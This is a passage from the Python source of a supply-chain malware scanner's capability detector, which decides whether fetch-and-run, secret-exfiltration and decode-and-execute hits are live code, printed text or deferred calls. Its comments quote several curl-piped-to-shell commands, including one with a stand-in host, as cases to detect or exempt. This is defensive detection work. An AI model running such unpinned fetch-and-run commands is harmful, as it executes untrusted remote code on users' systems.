        r"[ \t]{1,8}){0,3}(?!(?:if|for|while|switch|catch|with|return|else|do|try)\b)[A-Za-z_$#][\w$]{0,80}"
        r"[ \t]{0,8}\([^)\n]{0,300}\)[^{;\n]{0,200})\{",
        re.MULTILINE,
    )

    @staticmethod
    def _run_on_request(
        content: FileContent,
        language: str | None,
        hits: list[CapabilityHit],
        matched: tuple[Capability, ...],
        ctx: ScanContext | None = None,
    ) -> str:
        """Why this fetch-and-run happens only when someone asks for it, or "" if it does not.

        A shell script, Dockerfile or Makefile outside any hook runs when a person runs it. In
        Python and JavaScript, the question is whether every hit is inside a function body: a
        module's top level runs on import, a function's body when it is called.
        """
        if CapabilityDetector._skill_script(content.path, ctx):
            # A skill's bundled script is run by the agent whenever the skill is invoked -- as a
            # program, so its module-level calls run too. Nobody is asked first.
            return ""
        if SourcePaths.is_editor_extension(content.path) and (
            language in CapabilityDetector.SCRIPT_LANGUAGES_RUN_BY_HAND
            or CapabilityDetector._runs_a_downloaded_file(hits)
        ):
            # A script inside an extension -- a bundled `.bat` -- is run by the extension, not by a
            # person; and a download that is run, in one construct, is not lowered for sitting in a
            # function. The weaker combinations in an extension's code keep the ordinary lowering:
            # spawning, decoding and a request are what remote-development tools do all day
            # (Remote WSL, Codespaces, APKLab were blocked for it).
            return ""
        if language in CapabilityDetector.SCRIPT_LANGUAGES_RUN_BY_HAND:
            return CapabilityDetector.ON_REQUEST_REASONS[0]
        if language in CapabilityDetector.COMPILED_LANGUAGES:
            if CapabilityDetector._in_load_time_initialiser(content, hits, matched):
                return ""
            if language == "go" and CapabilityDetector._in_go_load_path(content, hits, matched):
                return ""
            return CapabilityDetector.ON_REQUEST_REASONS[2]
        offsets = [
            h.byte_start
            for h in hits
            if h.capability in matched
            or h.capability is Capability.DECODE
            or h.rule_id
            in (
                "AST.PY.IDENTITY_SENT",
                "AST.PY.ENVIRONMENT_SENT",
                "AST.PY.SECRET_SENT",
                "FLOW.JS.SECRET_SENT",
                "FLOW.JS.IDENTITY_SENT",
                "FLOW.JS.ENVIRONMENT_SENT",
            )
        ]
        if not offsets:
            return ""
        spans = CapabilityDetector._function_body_spans(content, language)
        if spans and all(any(start <= at < end for start, end in spans) for at in offsets):
            return CapabilityDetector.ON_REQUEST_REASONS[1]
        return ""

    _GO_FUNC = re.compile(
        r"^func[ \t]+([A-Za-z_]\w{0,80})[ \t]*\([^)\n]{0,300}\)[^{\n]{0,200}\{", re.MULTILINE
    )
    _GO_CALL = re.compile(r"\b([A-Za-z_]\w{0,80})[ \t]*\(")

    @staticmethod
    def _in_go_load_path(
        content: FileContent, hits: list[CapabilityHit], matched: tuple[Capability, ...]
    ) -> bool:
        """Whether a matched hit is in a Go function that runs when the package is imported.

        `init()` runs on import, and so does every package-level `var` initialiser: `var _ =
        setup()` calls `setup` before `main`, or before the importer's own code. The malicious Go
        typosquats of 2025 ran their payload as `var DdlXrFDZ = eGtROk()`. A function is on the
        load path if `init` or an initialiser calls it, directly or through other functions in
        the file; a hit inside one keeps its full weight.
        """
        text = content.text
        bodies: dict[str, tuple[int, int]] = {}
        declarations: list[tuple[int, int]] = []
        for found in CapabilityDetector._GO_FUNC.finditer(text):
            depth, index = 1, found.end()
            limit = min(len(text), index + 200_000)
            while index < limit and depth:
                depth += text[index] == "{"
                depth -= text[index] == "}"
                index += 1
            bodies.setdefault(found.group(1), (found.end(), index))
            declarations.append((found.start(), index))
        if not bodies:
            return False
        # Package-level code: everything outside function declarations, signature included, so
        # a function's own name in `func name(` is not read as a call from an initialiser.
        outside: list[str] = []
        cursor = 0
        for start, end in sorted(declarations):
            outside.append(text[cursor:start])
            cursor = end
        outside.append(text[cursor:])
        top_level = "".join(outside)
        roots = {m.group(1) for m in CapabilityDetector._GO_CALL.finditer(top_level)}
        reached = {"init"} | (roots & bodies.keys())
        frontier = list(reached)
        while frontier:
            name = frontier.pop()
            span = bodies.get(name)
            if span is None:
                continue
            for call in CapabilityDetector._GO_CALL.finditer(text, span[0], span[1]):
                callee = call.group(1)
                if callee in bodies and callee not in reached:
                    reached.add(callee)
                    frontier.append(callee)
        # Byte offsets of hits, mapped to text offsets via the line table.
        starts = content.line_starts
        line_offsets: list[int] = [0]
        for line in text.splitlines(keepends=True):
            line_offsets.append(line_offsets[-1] + len(line))
        from bisect import bisect_right

        for hit in hits:
            if hit.capability not in matched:
                continue
            row = bisect_right(starts, hit.byte_start) - 1
            at = line_offsets[min(row, len(line_offsets) - 1)]
            for name in reached:
                span = bodies.get(name)
                if span and span[0] <= at < span[1]:
                    return True
        return False

    @staticmethod
    def _in_load_time_initialiser(
        content: FileContent, hits: list[CapabilityHit], matched: tuple[Capability, ...]
    ) -> bool:
        """Whether any matched hit sits inside a Go `init()`, a Java static block or a C# static
        constructor -- found by brace matching from the opener, bounded."""
        text = content.raw
        offsets = [h.byte_start for h in hits if h.capability in matched]
        if not offsets:
            return False
        for opener in CapabilityDetector._LOAD_TIME_INITIALISER.finditer(content.text):
            start = len(content.text[: opener.end()].encode("utf-8"))
            depth, index, limit = 1, start, min(len(text), start + 200_000)
            while index < limit and depth:
                byte = text[index]
                depth += byte == 0x7B
                depth -= byte == 0x7D
                index += 1
            if any(start <= at < index for at in offsets):
                return True
        return False

    @staticmethod
    def _function_body_spans(content: FileContent, language: str | None) -> list[tuple[int, int]]:
        """Byte spans of the function bodies nothing on this file's load path reaches.

        A body counts as run on load when code that runs on load names its function -- called,
        or handed to `atexit.register` or a `Thread` -- or, transitively, when such a body does.
        `def _x(): ...` followed by `_x()` at module level is top-level code with one extra line.
        A Python decorator defined in the same file may call what it decorates and makes the body
        count; an imported one (`@app.route`, `@patch`) registers it.
        """
        if language == "python":
            return CapabilityDetector._python_deferred_spans(content)
        if language in ("javascript", "typescript"):
            return CapabilityDetector._js_deferred_spans(content)
        return []

    @staticmethod
    def _python_deferred_spans(content: FileContent) -> list[tuple[int, int]]:
        try:
            tree = PythonSyntax.shared(content.text)
        except (SyntaxError, ValueError, RecursionError):
            return []
        functions = [
            node
            for node in PythonSyntax.nodes(tree)
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef)
        ]
        if not functions or len(functions) > 5_000:
            return []

        # A decorator defined here that calls what it decorates in its own body -- not in a
        # wrapper it returns -- runs the function at definition: `def now(f): f(); return f`.
        # One that registers or wraps it (`gh_patch`, `functools.wraps`) runs nothing.
        def calls_its_argument(node: ast.FunctionDef | ast.AsyncFunctionDef) -> bool:
            params = [a.arg for a in node.args.args[:1]]
            if not params:
                return False
            pending: list[ast.AST] = list(node.body)
            while pending:
                current = pending.pop()
                if isinstance(current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda):
                    continue
                if (
                    isinstance(current, ast.Call)
                    and isinstance(current.func, ast.Name)
                    and current.func.id == params[0]
                ):
                    return True
                pending.extend(ast.iter_child_nodes(current))
            return False

        local = {node.name for node in functions if calls_its_argument(node)}

        def names_in(nodes: Sequence[ast.AST]) -> set[str]:
            found: set[str] = set()
            for root in nodes:
                for node in PythonSyntax.nodes(root):
                    if isinstance(node, ast.Name):
                        found.add(node.id)
                    elif isinstance(node, ast.Attribute):
                        found.add(node.attr)
            return found

        def decorator_names(node: ast.FunctionDef | ast.AsyncFunctionDef) -> set[str]:
            return names_in(list(node.decorator_list))

        def run_names(nodes: Sequence[ast.AST]) -> set[str]:
            """Names these nodes call, or hand to something that runs them unprompted.

            Handing a function to a registry -- `add_constructor(tag, f)`, `app.route(f)` --
            is not running it: a YAML loader's unsafe-tag handler runs when somebody loads a
            document that names the tag.
            """
            found: set[str] = set()
            for root in nodes:
                for node in PythonSyntax.of(root, ast.Call):
                    func = node.func
                    callee = (
                        func.id
                        if isinstance(func, ast.Name)
                        else func.attr
                        if isinstance(func, ast.Attribute)
                        else ""
                    )
                    found.add(callee)
                    owner = (
                        func.value.id
                        if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)
                        else ""
                    )
                    if (
                        callee in CapabilityDetector.RUNNERS
                        or f"{owner}.{callee}" in CapabilityDetector.RUNNERS
                    ):
                        for argument in [*node.args, *(k.value for k in node.keywords)]:
                            if isinstance(argument, ast.Name):
                                found.add(argument.id)
                            elif isinstance(argument, ast.Attribute):
                                found.add(argument.attr)
            return found

        nested = {
            id(inner)
            for outer in functions
            for inner in PythonSyntax.nodes(outer)
            if inner is not outer
        }
        from cordon_scanner.core.reachability import CallReachability

        on_load: list[ast.AST] = []
        for node in PythonSyntax.nodes(tree):
            if isinstance(node, ast.Module | ast.ClassDef):
                on_load.extend(
                    child
                    for child in node.body
                    if not isinstance(child, ast.FunctionDef | ast.AsyncFunctionDef | ast.ClassDef)
                    # A module's `if __name__ == "__main__":` block runs when the file is
                    # executed as a script, which is a request, not a load.
                    and not (isinstance(node, ast.Module) and CallReachability.is_main_guard(child))
                )
        # An instance method's dunder -- `__init__`, `__call__`, `__enter__` -- runs when the class
        # is instantiated, and that is a call like any other: xgboost's `RabitTracker.__init__`
        # binds a socket for a distributed job, and nothing builds a tracker on import. Dunders
        # that run when a class is defined or subclassed, and module-level `__getattr__`, still
        # count as run on load. A class used as another's base keeps its dunders, since the
        # subclass may be what is built.
        owner_of: dict[int, str] = {}
        bases_used: set[str] = set()
        for node in PythonSyntax.nodes(tree):
            if isinstance(node, ast.ClassDef):
                bases_used |= names_in(list(node.bases))
                for child in node.body:
                    if isinstance(child, ast.FunctionDef | ast.AsyncFunctionDef):
                        owner_of[id(child)] = node.name

        def dunder(node: ast.FunctionDef | ast.AsyncFunctionDef) -> bool:
            return node.name.startswith("__") and node.name.endswith("__")

        def on_instance(node: ast.FunctionDef | ast.AsyncFunctionDef) -> bool:
            return (
                dunder(node)
                and id(node) in owner_of
                and node.name not in CapabilityDetector.DEFINITION_TIME_DUNDERS
                and owner_of[id(node)] not in bases_used
            )

        reached: set[int] = set()
        for node in functions:
            if (dunder(node) and not on_instance(node)) or decorator_names(node) & local:
                reached.add(id(node))
        referenced = run_names(on_load) | {
            name for node in functions if id(node) in reached for name in run_names(node.body)
        }
        changed = True
        while changed:
            changed = False
            for node in functions:
                if id(node) in reached:
                    continue
                trigger = owner_of[id(node)] if on_instance(node) else node.name
                if trigger in referenced:
                    reached.add(id(node))
                    referenced |= run_names(node.body)
                    changed = True
        starts = [0]
        for line in content.raw.split(b"\n"):
            starts.append(starts[-1] + len(line) + 1)
        spans = []
        for node in functions:
            if id(node) in reached or id(node) in nested:
                continue
            first, last = node.body[0].lineno, node.end_lineno or node.body[-1].lineno
            if last < len(starts):
                spans.append((starts[first - 1], starts[last]))
        return spans

    @staticmethod
    def _js_deferred_spans(content: FileContent) -> list[tuple[int, int]]:
        # The pattern runs over text and the hits are byte offsets, which agree only on ASCII
        # source. Anything else finds no bodies, and the finding keeps its severity.
        if not content.raw.isascii():
            return []
        text = content.raw
        bodies: list[tuple[int, int, str]] = []
        for match in CapabilityDetector._JS_BODY_OPENER.finditer(content.text):
            open_brace = match.end() - 1
            named = re.search(
                r"([A-Za-z_$][\w$]{0,80})[ \t]{0,8}(?:=[^=>]{0,80}|\()", match.group(0)
            )
            name = named.group(1) if named and named.group(1) != "function" else ""
            depth = 0
            for index in range(open_brace, min(len(text), open_brace + 200_000)):
                byte = text[index]
                if byte == 0x7B:
                    depth += 1
                elif byte == 0x7D:
                    depth -= 1
                    if depth == 0:
                        # `(async function go() { ... })()` and `(() => { ... })()` run as the
                        # file loads: an immediately-invoked body is top-level code.
                        after = text[index + 1 : index + 16].lstrip()
                        if not (
                            after.startswith(b"(")
                            or (after[:1] == b")" and after[1:].lstrip().startswith(b"("))
                        ):
                            bodies.append((open_brace, index, name))
                        break
        # Fixpoint: a body is reached when its name appears outside every unreached body.
        unreached = [b for b in bodies if b[2]]
        changed = True
        while changed:
            changed = False
            for body in list(unreached):
                pattern = re.compile(rf"(?<![\w$]){re.escape(body[2])}(?![\w$])")
                for occurrence in pattern.finditer(content.text):
                    at = occurrence.start()
                    inside = any(start <= at <= end for start, end, _ in unreached)
                    preceding = content.text[max(0, at - 40) : at].rstrip()
                    following = content.text[occurrence.end() : occurrence.end() + 40].lstrip()
                    # Called, or handed to something that calls it (`setTimeout(setup)`,
                    # `process.on("exit", setup)`). Exporting a function runs nothing.
                    used = following.startswith("(") or (
                        preceding.endswith(("(", ",")) and following.startswith((")", ","))
                    )
                    if not inside and used and not preceding.endswith("function"):
                        unreached.remove(body)
                        changed = True
                        break
        return [(start, end) for start, end, _ in unreached]

    @staticmethod
    def _is_minified(content: FileContent) -> bool:
        """Whether this file looks like build output regardless of its name.

        Long lines, an extension a bundler writes, AND long lines being what the
        file is mostly made of. See `BUNDLED_SUFFIXES` for why the second is not
        optional and `MINIFIED_MEAN_LINE` for why the third is not either.
        """
        if content.longest_line <= CapabilityDetector.MINIFIED_LINE:
            return False
        suffix = PurePosixPath(content.path).suffix.lower()
        if suffix not in CapabilityDetector.BUNDLED_SUFFIXES:
            return False
        lines = max(1, len(content.line_starts))
        return len(content.raw) / lines > CapabilityDetector.MINIFIED_MEAN_LINE

    @staticmethod
    def _satisfying_region(content: FileContent, hits: list[CapabilityHit]) -> bytes:
        """The bytes the composite actually matched across, plus a margin.

        A window around the ANCHOR is the wrong region to look in. The anchor is one
        of several hits and not necessarily the fetch: in Elasticsearch's
        `setup_node.sh` the anchor landed 400 bytes away from the `curl`, so the pin in
        the URL was outside the window and the file was still called malware.

        The composite matched because a SET of hits sat close enough together, so that
        set is the region any statement about the match has to be made over.
        """
        if not hits:
            return b""
        start = min(hit.byte_start for hit in hits)
        end = max(hit.byte_end for hit in hits)
        return content.raw[max(0, start - 200) : end + 200]

    #: A fetch whose target is identified by something immutable.
    #:
    #: A version in the path, a release asset under a tag, a commit digest, or a
    #: checksum verified nearby. Any of those means the bytes that arrive are the bytes
    #: somebody chose, so the fetch is reviewable even though it crosses the network.
    #:
    #: What this separates, and why it is worth a category rather than a severity: the
    #: Codecov bash uploader was `curl -s https://codecov.io/bash | bash` -- no version,
    #: nothing to verify, and whatever the host served that day is what ran. That is the
    #: attack `MALWARE.DROPPER.001` is named for. Elasticsearch's
    #: `.buildkite/scripts/setup_node.sh` runs
    #: `curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.4/install.sh | bash`,
    #: which is the same four shell tokens and a completely different proposition.
    #:
    #: Deliberately NOT "the host is well known". A popular host is not a control, and
    #: a list of trusted domains is a list somebody will add to.
    PINNED_FETCH = re.compile(
        rb"""(?ix)
        (?:
            /v?\d+\.\d+(?:\.\d+)?/          # a version as a path segment
          | /releases/download/[^/\s]+/       # a release asset under a tag
          | /archive/refs/tags/                # a tagged source archive
          | @[0-9a-f]{40}\b                   # a git commit pin
          | [?&](?:ref|sha|commit)=[0-9a-f]{7,40}\b
          | sha(?:1|256|512)sum[ \t]+(?:-c|--check)
          | gpg[^\n]{0,80}--verify
          | cosign[ \t]+verify
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    #: Statements whose quoted argument is shown to somebody, not run.
    #:
    #: Make's three diagnostic functions, and the printing commands of every shell
    #: and language that appears in a build file. A capability matched inside the
    #: string one of these is given is a capability the file TALKS ABOUT.
    DIAGNOSTIC_STATEMENT = re.compile(
        rb"""(?ix)
        ^[ \t]*
        (?:
            [@-]{0,2}[ \t]*
            (?:echo|printf|print|puts|say|warn|
               console\.(?:log|info|warn|error)|
               write-host|write-output|write-warning)
          | \$\((?:warning|info|error)\b
        )
        """,
        re.VERBOSE | re.IGNORECASE,
    )

    #: A line of a doctest or an interactive transcript.
    #:
    #: `>>>` and `...` are Python's doctest prompts, `$` and `#` a shell transcript,
    #: `In [n]:` IPython's. A capability named on one of those lines is an ILLUSTRATION
    #: of an API: `aiohttp`'s own docstrings open a session in a doctest, `diffusers`
    #: fetches an image with `requests.get` in one, and both were read as code.
    #:
    #: The secrets detector has asked this question since its second release and this
    #: one did not, which is the same asymmetry the comment test had.
    EXAMPLE_PROMPT = re.compile(rb"^[ \t]*(?:>>>|\.\.\.|\$[ \t]|#[ \t]|In[ \t]\[\d+\]:)")

    @staticmethod
    def _is_example_line(content: FileContent, offset: int) -> bool:
        """Whether this offset sits on a transcript line rather than on code."""
        line = content.line_text(content.line_of(offset))
        if not line:
            return False
        return CapabilityDetector.EXAMPLE_PROMPT.match(line.encode("utf-8", "replace")) is not None

    @staticmethod
    def _is_comment(content: FileContent, offset: int, language: str | None) -> bool:
        """Whether this capability was named in a comment. See `core.comments`.

        Through the memo on `FileContent`, because every match on one line asks
        the same question of that line and the answer is a scan of it.
        """
        start = content.comment_column(content.line_of(offset), language)
        return start is not None and content.column_of(offset) - 1 >= start

    @staticmethod
    def _is_printed_text(content: FileContent, start: int, end: int) -> bool:
        """Whether this match sits inside a string that is printed rather than run.

        The worst false positive found against real code, and the clearest. The
        Makefile in `spf13/cobra` - one of the most depended-upon Go libraries in
        existence - carries this:

            ifeq (, $(shell which golangci-lint))
            $(warning "could not find golangci-lint, run: curl -sfL https://... | sh")
            endif

        That is the text printed to a developer who is missing a tool. Cordon read
        the `curl ... | sh` inside it and reported MALWARE.DROPPER.001 at CRITICAL,
        in the MALICIOUS category, plus SUSPECT.DROPPER.001 on the same line. An
        accusation of that weight against a printed help message is not a tuning
        problem; it is the finding that ends the conversation about whether to adopt
        the tool.

        Install instructions embedded in diagnostics, READMEs and `echo` lines are
        everywhere, because `curl ... | sh` is how a great deal of software
        documents its own installation.

        TWO conditions, and the second is what keeps this from becoming a hole:

        The statement must be a printer, and the match must lie ENTIRELY inside its
        quoted argument. `echo "run: curl x | sh"` has the whole construct inside
        the quotes and is text. `echo "$(curl x)" | sh` pipes into a shell, so the
        `| sh` that makes it dangerous sits OUTSIDE the quotes and is not
        suppressed. The distinction is exactly the one that matters, and it falls
        out of the quote test rather than needing a second rule.
        """
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False
        encoded = line.encode("utf-8", "surrogatepass")
        statement = CapabilityDetector.DIAGNOSTIC_STATEMENT.match(encoded)
        if not statement:
            return False

        # Both ends inside the same quoted run. `column_of` is one-based, matching
        # how a finding reports a column.
        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = CapabilityDetector._quote_depth(line, first)
        closing = CapabilityDetector._quote_depth(line, last)
        if opening is None or opening != closing:
            return False

        # Quoted is not the same as inert. A shell runs `$(...)` and backticks
        # inside DOUBLE quotes, so `echo "$(curl -s https://host/s)" | sh` really
        # does fetch and execute -- the quotes are around the output, not around
        # the command. Suppressing the egress there would have taken one half of
        # the dropper composite away from a genuine fetch-and-run.
        #
        # Single quotes are inert in every shell, so a substitution inside them is
        # literal text and stays suppressed.
        # Scanned from the end of the diagnostic statement rather than the start of
        # the line, because `$(warning ...)` opens with `$(` itself. Make's
        # `warning`, `info` and `error` are FUNCTIONS, not command substitutions --
        # only `$(shell ...)` runs anything -- so counting that paren read every
        # Make diagnostic as executing its own message, which put the cobra
        # Makefile straight back to critical.
        return not (
            opening == '"'
            and CapabilityDetector._inside_substitution(line, first, begin=statement.end())
        )

    @staticmethod
    def _is_literal_backtick(content: FileContent, start: int) -> bool:
        """Whether a backtick at this offset is a character inside a single-quoted string.

        `getgrav/grav` uses the backtick as its `preg` delimiter and builds the pattern by
        concatenation: ``'`' . $token[0] . '([A-Za-z0-9+/]+={0,2})' . $token[1] . '`mu'``.
        Every backtick in it is a character in a single-quoted PHP string, and the spawn
        pattern read the pair as a command substitution -- with a `base64_decode` a line
        below, which made it a decode-and-execute finding.

        Single quotes only. In shell, `x="`ls`"` IS a substitution: double quotes
        interpolate and backticks inside them run. A single-quoted string does not, in
        shell or in PHP, which is why the test asks which quote rather than whether there
        is one.
        """
        line = content.line_text(content.line_of(start))
        if not line:
            return False
        column = content.column_of(start) - 1
        if column >= len(line) or line[column] != "`":
            return False
        return CapabilityDetector._quote_depth(line, column) == "'"

    @staticmethod
    def _is_quoted_pipeline(content: FileContent, start: int, end: int) -> bool:
        """Whether a fetch-and-run construct lies wholly inside a quoted string.

        `_is_printed_text` above requires a PRINTER in front of the quotes, which was
        the conservative first cut of this idea. The reasoning does not need one: a `|`
        inside quotes is not a pipeline, because the shell never sees it as one. What
        the string is then used for -- echoed, assigned, passed to a function -- does
        not change that.

        Measured on the third corpus pass, where `SUSPECT.DROPPER.001` became the
        largest remaining blocker at 39 repositories. A good part of it was software
        telling its user how to install something, in a string the printer test could
        not see:

            arg0="curl -fsSL https://code-server.dev/install.sh | sh -s --"
            check_prereq bun "Install: curl -fsSL https://bun.sh/install | bash"
            handle_error "curl is not installed but --with-ollama needs it"

        The first is a variable, the second an argument to the project's own helper,
        the third an error message. None is a pipeline.

        A SUBSTITUTION inside the quotes is still a substitution -- `"$(curl -s x)"`
        runs, which is why that check is shared with the printer path -- and the
        matched text itself must contain no `$(` or backtick, so a construct that
        reaches outside its own quotes is untouched. If the string is later handed to
        `eval`, the `eval` is its own execute capability and the composite still has
        both halves.
        """
        line_number = content.line_of(start)
        line = content.line_text(line_number)
        if not line:
            return False

        first = content.column_of(start) - 1
        last = content.column_of(end - 1) - 1
        opening = CapabilityDetector._quote_depth(line, first)
        if opening is None or opening != CapabilityDetector._quote_depth(line, last):
            return False

        matched = line[first : last + 1]
        if "$(" in matched or "`" in matched:
            return False
        return not (opening == '"' and CapabilityDetector._inside_substitution(line, first))

    @staticmethod
    def _inside_substitution(line: str, offset: int, *, begin: int = 0) -> bool:
        """Whether `offset` sits inside a `$(...)` or a backtick pair on this line.

        Nesting counted for `$(`, since `$(dirname $(which x))` is ordinary.
        Backticks cannot nest without escaping, so they toggle.

        `begin` skips the construct that introduced the diagnostic, which in a
        Makefile is itself spelled `$(`.
        """
        depth = 0
        backtick = False
        index = begin
        while index < min(offset, len(line)):
            if line[index] == "\\":
                index += 2
                continue
            if line.startswith("$(", index):
                depth += 1
                index += 2
                continue
            if line[index] == ")" and depth:
                depth -= 1
            elif line[index] == "`":
                backtick = not backtick
            index += 1
        return depth > 0 or backtick

    @staticmethod
    def _quote_depth(line: str, offset: int) -> str | None:
        """Which quote character encloses `offset`, or None if it is unquoted.

        Single and double quotes tracked separately, because a shell treats them
        differently and an apostrophe inside a double-quoted message -- "couldn't
        find golangci-lint" -- must not read as opening a single-quoted string.
        Escaped quotes are skipped for the same reason.
        """
        quote: str | None = None
        index = 0
        while index < min(offset, len(line)):
            character = line[index]
            if character == "\\":
                index += 2
                continue
            if quote is None and character in "\"'":
                quote = character
            elif character == quote:
                quote = None
            index += 1
        return quote

    def _resolved_capabilities(
        self, unit: FileUnit, content: FileContent, ctx: ScanContext
    ) -> tuple[list[CapabilityHit], list[Command]]:
        """Capabilities the patterns cannot see, resolved from the parsed tree.

        Added to the regex hits rather than replacing them. The patterns stay
        the fast path and the answer for every language this cannot parse; this
        catches what a byte pattern structurally cannot -- an aliased import, a
        bound name, a spliced string -- because those are the same primitive
        written so that no literal appears.

        Returns the commands found at spawn sites alongside the capabilities,
        since those are what the shell rules are then run against.

        Python only. `ast` is in the standard library, so this costs nothing
        against the zero-runtime-dependency constraint. JavaScript needs a
        parser that is not, which is a decision about that constraint rather
        than a line of code, and it is not taken here.
        """
        if unit.language in ("javascript", "typescript"):
            return self._javascript_secret_flow(content), []
        if unit.language != "python":
            return [], []

        from cordon_scanner.detect.pyast import PythonAnalyzer, PythonSource

        source = (
            PythonSource.startup_lines(content.text)
            if content.path.endswith(".pth")
            else content.text
        )
        resolved = PythonAnalyzer.analyse(
            source, follow_literals=not SourcePaths.is_test_material_here(content.path, ctx)
        )
        return (
            [
                CapabilityHit(
                    capability=hit.capability,
                    rule_id=(
                        "AST.PY.IDENTITY_SENT"
                        if hit.detail.startswith("identity sent")
                        else "AST.PY.ENVIRONMENT_SENT"
                        if hit.detail.startswith("environment sent")
                        else "AST.PY.SECRET_SENT"
                        if hit.detail.startswith("secret sent")
                        # A spawn, request or credential read written inside a string the file
                        # then executes. See `MALWARE.INSTALL.HIDDEN_ACTION.001`.
                        else "AST.PY.UNSAFE_MODEL_LOAD"
                        if hit.detail.startswith("unsafe model load")
                        else "AST.PY.REMOTE_MODEL_CODE"
                        if hit.detail.startswith("remote model code")
                        else "AST.PY.UNSAFE_MODEL_OPTION"
                        if hit.detail.startswith("unsafe model option")
                        else "AST.PY.HIDDEN_ACTION"
                        if hit.detail.startswith("executed literal")
                        and hit.capability
                        in (
                            Capability.SPAWN,
                            Capability.EGRESS,
                            Capability.FETCH_EXEC,
                            Capability.CREDENTIAL,
                        )
                        else f"AST.PY.{hit.capability.name}"
                    ),
                    byte_start=min(
                        self._span_of_line(content, hit.line)[0] + hit.column,
                        self._span_of_line(content, hit.line)[1],
                    ),
                    byte_end=self._span_of_line(content, hit.line)[1],
                    line=hit.line,
                    fixed=hit.fixed_command,
                    resolved=True,
                )
                for hit in resolved
            ],
            [embedded.Command(text=hit.command, line=hit.line) for hit in resolved if hit.command],
        )

    def _javascript_secret_flow(self, content: FileContent) -> list[CapabilityHit]:
        """`FLOW.JS.SECRET_SENT`: a named credential in a request to a host outside its home.
        See `detect/secretflow.py`."""
        from cordon_scanner.detect.secretflow import JavaScriptFlow, JavaScriptLeak

        text = content.text
        sends: list[tuple[int, Capability, str]] = [
            (offset, Capability.CREDENTIAL, "FLOW.JS.SECRET_SENT")
            for offset, _key, _host in JavaScriptFlow.findings(text)
        ]
        # The machine's identity and the whole environment, as `AST.PY.IDENTITY_SENT` and
        # `AST.PY.ENVIRONMENT_SENT` read them in Python: `os.hostname()` and `process.env` in what
        # a request sends.
        sends += [
            (
                offset,
                Capability.RECONNAISSANCE if kind == "identity" else Capability.CREDENTIAL,
                "FLOW.JS.IDENTITY_SENT" if kind == "identity" else "FLOW.JS.ENVIRONMENT_SENT",
            )
            for offset, kind in JavaScriptLeak.findings(text)
        ]
        hits: list[CapabilityHit] = []
        for offset, capability, rule_id in sends:
            line = text.count("\n", 0, offset) + 1
            start, end = self._span_of_line(content, line)
            hits.append(
                CapabilityHit(
                    capability=capability,
                    rule_id=rule_id,
                    byte_start=start,
                    byte_end=end,
                    line=line,
                    resolved=True,
                )
            )
        return hits

    @staticmethod
    def _span_of_line(content: FileContent, line: int) -> tuple[int, int]:
        """The byte range of a 1-based line.

        The AST tier and the embedded-shell tier report a line and no offsets,
        because neither works on byte positions -- one walks a syntax tree and
        the other matches inside an extracted string. Both used to record
        `byte_start=0, byte_end=0`, and when such a hit anchored a composite the
        report showed the first line of the file as the evidence for a finding
        located elsewhere, with a match hash taken over zero bytes: every one of
        those findings carried `sha256:e3b0c442...`, the hash of the empty
        string, under an explanation promising that "the hash identifies it".

        Converting the line back to a span costs a lookup and makes the
        evidence, the hash and the location describe the same thing.
        """
        starts = content.line_starts
        if not starts or line < 1:
            return (0, 0)
        index = min(line, len(starts)) - 1
        start = starts[index]
        end = starts[index + 1] if index + 1 < len(starts) else len(content.raw)
        return (start, max(start, end))

    CREDENTIAL_STORE_RULE = "SUSPECT.EXFIL.CREDENTIAL_STORE.001"
    """The one composite the authentication-filename ceiling applies to."""

    DROP_POINT_RULE = "INTEL.EGRESS.DROP_POINT.001"
    INTERACTION_RULE = "INTEL.EGRESS.INTERACTION.001"
    """Egress to an out-of-band interaction service. See `intel.hosts.INTERACTION_HOSTS`."""
    """Rule id for egress to a destination that is itself informative.

    Named so composites can refer to it. It is a capability label rather than a
    finding, like the AST tier's, and it exists because the capability model
    deliberately cannot tell one outbound request from another -- posting to a
    metrics endpoint and posting to a Discord webhook are both `egress`.
    """

    def _ast_rule_capabilities(
        self,
        content: FileContent,
        candidates: tuple[CompiledRule, ...],
        language: str | None,
    ) -> list[CapabilityHit]:
        """Capability primitives from `kind: ast` rules, resolved by parsing.

        Why these are primitives rather than findings of their own. Every rule
        in the pack is either a capability label or a composite over labels, and
        the composites already carry the correlation, the proximity window, the
        install-time context and the scoring. An `ast` rule that produced its
        own finding would need all of that again; an `ast` rule that produces a
        LABEL makes every composite already written -- dropper, exfil, reverse
        shell, decode-then-execute -- resolve through aliases and folded strings
        for free.

        So this is not a second detection engine beside the regex one. It is
        the same engine, given eyes for the shapes a byte pattern structurally
        cannot see:

            f = os.system          # the call site says `f`
            f(command)

            getattr(os, "sys" + "tem")(command)   # the name is never written

        Python resolves in the base install (stdlib `ast`); other languages
        resolve through a provider an optional extra installs, and a language
        with no installed provider keeps the byte tier and is reported as a
        coverage limit -- never silently treated as fully scanned. This is
        additive: a file no provider can parse is not a file that went
        unexamined, because the regex tier still ran over it.
        """
        ast_rules = [c for c in candidates if c.match.kind is MatchKind.AST and c.match.ast_query]
        if not ast_rules:
            return []

        from cordon_scanner.detect.ast_providers import AstProviders

        # Rule selection already restricted `candidates` to this file's language,
        # so an ast rule here is one that applies to it. Resolve with the
        # language's provider, or return nothing when none is installed -- the
        # regex tier still ran over the file, so this is an addition that is
        # absent, not a gap that is hidden.
        provider = AstProviders.ast_provider_for(language)
        if provider is None:
            return []

        calls = provider.resolve_calls(content.text)
        if not calls:
            return []

        hits: list[CapabilityHit] = []
        for compiled in ast_rules:
            capability = compiled.rule.capability
            if capability is None:
                continue
            for call in compiled.match.ast_query.matching(calls):
                line_start, line_end = self._span_of_line(content, call.line)
                # The call's own position, not the start of its line: on a
                # minified bundle the whole file is one line, so a line-start
                # offset would put every call at the same place and defeat a
                # composite's byte-distance bound.
                start = min(line_start + call.column, line_end)
                hits.append(
                    CapabilityHit(
                        capability=capability,
                        rule_id=compiled.id,
                        byte_start=start,
                        byte_end=line_end,
                        line=call.line,
                        resolved=True,
                    )
                )
        return hits

    _JS_DOWNLOAD = re.compile(
        r"\b(?:https?\s{0,4}\.\s{0,4}(?:get|request)|fetch|axios(?:\s{0,4}\.\s{0,4}get)?|got|needle|"
